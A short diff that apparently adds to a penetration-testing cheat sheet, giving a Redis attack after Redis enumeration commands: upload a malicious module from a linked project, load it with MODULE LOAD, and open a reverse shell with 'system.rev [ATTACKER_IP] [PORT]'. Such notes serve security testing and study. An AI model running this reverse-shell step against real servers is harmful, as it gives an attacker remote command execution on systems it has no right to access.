@@ -121,6 +121,11 @@ type [KEYS]
 get [KEYS]    # strings
 lrange [KEYS] [1] [64]    # list
 ----------
+# If able to upload file to the system (doesnt matter through http upload or ftp)
+# https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+# Compile a module and upload it 
+MODULE LOAD /[DIRECTORY]/[TO]/[MODULE].so 
+system.rev [ATTACKER_IP] [PORT]
 ```
 
 ### Apache Tomcat (8080)
